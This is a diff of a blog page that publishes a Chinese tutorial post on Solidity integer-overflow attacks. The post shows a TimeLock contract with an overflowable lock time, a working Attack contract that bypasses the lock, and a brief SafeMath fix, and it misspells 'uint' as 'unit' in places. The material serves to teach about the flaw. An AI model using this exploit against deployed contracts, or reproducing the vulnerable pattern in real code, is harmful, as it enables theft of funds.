@@ -4,7 +4,7 @@
 <meta name="description" content=""/>
 <meta name="viewport" content="width=device-width, initial-scale=1"/>
 
-<title>生活随想 | Mark World</title>
+<title>智能合约Solidity安全②-数字溢出攻击Overflow | Mark World</title>
 
 <link rel="shortcut icon" href="https://marknft.github.io/favicon.ico?v=1652159217362">
 
@@ -25,11 +25,11 @@
 
 
 
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
 </head>
 <body>
 <div class="main gt-bg-theme-color-first">
-    <div class="main-content">
-        <nav class="navbar navbar-expand-lg">
+    <nav class="navbar navbar-expand-lg">
     <div class="navbar-brand">
         <img class="user-avatar" src="/images/avatar.png" alt="头像">
         <div class="site-name gt-c-content-color-first">
@@ -85,51 +85,144 @@
     </div>
 </nav>
 
-        <div class="current-tag-container">
-            <h2 class="title gt-c-content-color-first">
-                #生活随想
-            </h2>
-        </div>
-        <div class="post-list-container">
-    <div class="post-inner">
-        
-            <div class="post gt-bg-theme-color-second">
-                <div class="post-left">
-                    <div>
-                        
-                        <a href="https://marknft.github.io/post/countrymind/">
-                            <span class="post-title gt-c-content-color-first">小镇做题家出身，可能会有哪些思想糟粕？</span>
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    智能合约Solidity安全②-数字溢出攻击Overflow
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-05-10 ·
+                    </time>
+                    
+                        <a href="https://marknft.github.io/tag/kp27yV9HV/" class="post-tags">
+                            # 区块链
                         </a>
-                    </div>
-                    <div class="gt-post-content post-abstract gt-c-content-color-second">
-                        <pre><code>“小镇做题家”，网络词汇，指“出身小城镇，埋头苦读，擅长应试，但缺乏一定视野和资源的青年学子”
-</code></pre>
-
-                    </div>
-                    <div class="post-info">
-                        <time class="post-time gt-c-content-color-first">
-                            发布于 · 2022-04-18 ·
-                        </time>
-                        
-                            <a href="https://marknft.github.io/tag/zkDi9o-j9/" class="post-tag">
-                                # 生活随想
-                            </a>
-                        
-                    </div>
+                    
                 </div>
-                
-                    <a href="https://marknft.github.io/post/countrymind/" class="post-feature-image"
-                       style="background-image: url('https://marknft.github.io/post-images/countrymind.jpg')">
-                    </a>
-                
+                <div class="post-content">
+                    <pre><code>数字溢出会出现不可意料的风险
+</code></pre>
+<!-- more -->
+<h2 id="正文">正文</h2>
+<p>因为solidity的unit数字类型默认有范围，会有上下溢出风险</p>
+<pre><code>unit unit256
+0 &lt;= x &lt;=2**256 -1 
+// 2**256 -1 +1 = 0
+</code></pre>
+<h3 id="溢出代码案例">溢出代码案例:</h3>
+<p>默认存储金额一周后可取出，使用攻击数字溢出，可以现存现取</p>
+<pre><code>pragma solidity ^0.6.10;
+
+contract TimeLock {
+    mapping(address =&gt; uint) public balances;
+    mapping(address =&gt; uint) public lockTime;
+
+    function deposit() external payable {
+        balances[msg.sender] +=msg.value;
+        lockTime[msg.sender] = now + 1 weeks;
+    }
+
+    function increaseLockTime(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += _secondsToIncrease;
+    }
+
+    function withdraw() public {
+        require(balances[msg.sender] &gt; 0, &quot;Insufficient funds&quot;);
+        require(now &gt; lockTime[msg.sender], &quot;Lock time not expired&quot;);
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+    
+        (bool sent, ) = msg.sender.call{value: amount}(&quot;&quot;);
+        require(sent, &quot;Failed to send Ether&quot;);
+    }
+
+}
+
+contract Attack {
+    TimeLock timeLock;
+
+    constructor(TimeLock _timeLock) public {
+        timeLock = TimeLock(_timeLock);
+    }
+    fallback() external payable {}
+
+    function attack() public payable {
+        timeLock.deposit{value: msg.value}();
+        timeLock.increaseLockTime(
+            uint(-timeLock.lockTime(address(this)))
+        );
+        timeLock.withdraw();
+    }
+}
+</code></pre>
+<h3 id="解决方案">解决方案：</h3>
+<ul>
+<li>
+<p>使用SafeMath库保护<br>
+using SafeMath for unit;</p>
+<hr>
+</li>
+</ul>
+<blockquote>
+<p>这里是记录学习分享的内容，不定时发布。</p>
+</blockquote>
+<p><strong>封面图</strong><br>
+<img src="https://marknft.github.io/post-images/1652159100742.jpg" alt="" loading="lazy"><br>
+<a href="https://www.youtube.com/channel/UCS8BqjUmQbiNnr0GgqUiiBw">欢迎订阅我的Youtube频道</a></p>
+<p>(完)</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://marknft.github.io/post/SoliditySecurity-1/" class="post-title gt-a-link">
+                    智能合约Solidity安全①-重入攻击Reentrancy
+                </a>
             </div>
         
-    </div>
-</div>
-        <div class="pagination-container">
-    
-    
-</div>
+
+        
+            <span id="/post/SoliditySecurity-2/" class="leancloud_visitors" data-flag-title="智能合约Solidity安全②-数字溢出攻击Overflow">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'gfM9U64ngOE01OyMgm75982U-gzGzoHsz',
+		appKey: 'Vsb4W2VkOtP8I2eJquuwB5OA',
+		avatar: 'identicon',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: 'Just Go Go',
+		visitor: true,
+	});
+</script>
+
+        
 
         <div class="site-footer gt-c-content-color-first">
     <div class="slogan gt-c-content-color-first"></div>
